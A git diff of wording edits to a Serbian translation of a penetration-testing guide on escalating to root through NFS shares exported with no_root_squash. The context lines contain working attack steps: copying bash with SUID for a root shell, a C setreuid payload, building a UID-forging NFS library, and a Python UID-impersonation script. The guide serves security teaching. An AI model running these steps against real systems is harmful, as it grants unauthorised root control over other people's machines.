@@ -5,13 +5,13 @@
 
 ## Squashing Basic Info
 
-NFS obično (posebno na linuxu) veruje na označeni `uid` i `gid` od strane klijenta koji se povezuje za pristup datotekama (ako se ne koristi kerberos). Međutim, postoje neka podešavanja koja se mogu postaviti na serveru da **promene ovo ponašanje**:
+NFS obično (posebno u linuxu) veruje na označeni `uid` i `gid` od strane klijenta koji se povezuje za pristup datotekama (ako se ne koristi kerberos). Međutim, postoje neka podešavanja koja se mogu postaviti na serveru da **promene ovo ponašanje**:
 
 - **`all_squash`**: Smanjuje sve pristupe mapirajući svakog korisnika i grupu na **`nobody`** (65534 unsigned / -2 signed). Stoga, svako je `nobody` i nijedan korisnik se ne koristi.
-- **`root_squash`/`no_all_squash`**: Ovo je podrazumevano na Linuxu i **smanjuje samo pristup sa uid 0 (root)**. Stoga, svaki `UID` i `GID` su povereni, ali `0` se smanjuje na `nobody` (tako da nije moguća imitación root-a).
+- **`root_squash`/`no_all_squash`**: Ovo je podrazumevano na Linuxu i **smanjuje samo pristup sa uid 0 (root)**. Stoga, svaki `UID` i `GID` su povereni, ali `0` se smanjuje na `nobody` (tako da nije moguća root imitacija).
 - **``no_root_squash`**: Ova konfiguracija, ako je omogućena, čak ni ne smanjuje korisnika root. To znači da ako montirate direktorijum sa ovom konfiguracijom, možete mu pristupiti kao root.
 
-U **/etc/exports** datoteci, ako pronađete neki direktorijum koji je konfigurisan kao **no_root_squash**, tada možete **pristupiti** njemu **kao klijent** i **pisati unutar** tog direktorijuma **kao** da ste lokalni **root** mašine.
+U **/etc/exports** datoteci, ako pronađete neki direktorijum koji je konfigurisan kao **no_root_squash**, tada možete **pristupiti** njemu kao **klijent** i **pisati unutar** tog direktorijuma **kao** da ste lokalni **root** mašine.
 
 Za više informacija o **NFS** proverite:
 
@@ -27,7 +27,7 @@ Za više informacija o **NFS** proverite:
 Opcija 1 koristeći bash:
 - **Montiranje tog direktorijuma** na klijentskoj mašini, i **kao root kopiranje** unutar montirane fascikle **/bin/bash** binarnog fajla i davanje mu **SUID** prava, i **izvršavanje sa žrtvovane** mašine tog bash binarnog fajla.
 - Imajte na umu da da biste bili root unutar NFS deljenja, **`no_root_squash`** mora biti konfigurisan na serveru.
-- Međutim, ako nije omogućeno, mogli biste se uzdići na drugog korisnika kopirajući binarni fajl na NFS deljenje i dajući mu SUID dozvolu kao korisniku na koji želite da se uzdignete.
+- Međutim, ako nije omogućeno, mogli biste se uzdići na drugog korisnika kopirajući binarni fajl na NFS deljenje i dajući mu SUID dozvolu kao korisniku na kojeg želite da se uzdignete.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -41,7 +41,7 @@ cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
 Opcija 2 koristeći C kompajlirani kod:
-- **Montiranje te direktorije** na klijentskoj mašini, i **kao root kopiranje** unutar montirane fascikle našeg kompajliranog payload-a koji će zloupotrebiti SUID dozvolu, dati mu **SUID** prava, i **izvršiti sa žrtvinske** mašine taj binarni fajl (ovde možete pronaći neke [C SUID payloads](payloads-to-execute.md#c)).
+- **Montiranje te direktorije** na klijentskoj mašini, i **kao root kopiranje** unutar montirane fascikle našeg kompajliranog payload-a koji će zloupotrebiti SUID dozvolu, dati mu **SUID** prava, i **izvršiti sa žrtvovane** mašine taj binarni fajl (možete pronaći ovde neke [C SUID payloads](payloads-to-execute.md#c)).
 - Iste restrikcije kao pre
 ```bash
 #Attacker, as root user
@@ -60,7 +60,7 @@ cd <SHAREDD_FOLDER>
 
 > [!TIP]
 > Imajte na umu da ako možete da kreirate **tunel sa vašeg računara na računar žrtve, još uvek možete koristiti Remote verziju da iskoristite ovu eskalaciju privilegija tunelovanjem potrebnih portova**.\
-> Sledeći trik se koristi u slučaju da datoteka `/etc/exports` **ukazuje na IP**. U ovom slučaju **nećete moći da koristite** u bilo kom slučaju **remote exploit** i biće potrebno da **iskoristite ovaj trik**.\
+> Sledeći trik se koristi u slučaju da datoteka `/etc/exports` **ukazuje na IP**. U ovom slučaju **nećete moći da koristite** u bilo kom slučaju **remote exploit** i biće potrebno da **zloupotrebite ovaj trik**.\
 > Još jedan neophodan uslov za rad exploita je da **izvoz unutar `/etc/export`** **mora koristiti `insecure` flag**.\
 > --_Nisam siguran da li će ovaj trik raditi ako `/etc/export` ukazuje na IP adresu_--
 
@@ -77,11 +77,11 @@ Koraci za kompajliranje biblioteke mogu zahtevati prilagođavanja u zavisnosti o
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
-#### Sprovođenje Eksploita
+#### Sprovođenje Eksploata
 
-Eksploit uključuje kreiranje jednostavnog C programa (`pwn.c`) koji povećava privilegije na root i zatim izvršava shell. Program se kompajlira, a rezultantni binarni fajl (`a.out`) se postavlja na deljenje sa suid root, koristeći `ld_nfs.so` da lažira uid u RPC pozivima:
+Eksploatacija uključuje kreiranje jednostavnog C programa (`pwn.c`) koji povećava privilegije na root i zatim izvršava shell. Program se kompajlira, a rezultantni binarni fajl (`a.out`) se postavlja na deljenje sa suid root, koristeći `ld_nfs.so` da lažira uid u RPC pozivima:
 
-1. **Kompajlirajte kod eksploita:**
+1. **Kompajlirajte kod eksploata:**
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
@@ -120,7 +120,7 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-Trči kao:
+Pokreni kao:
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
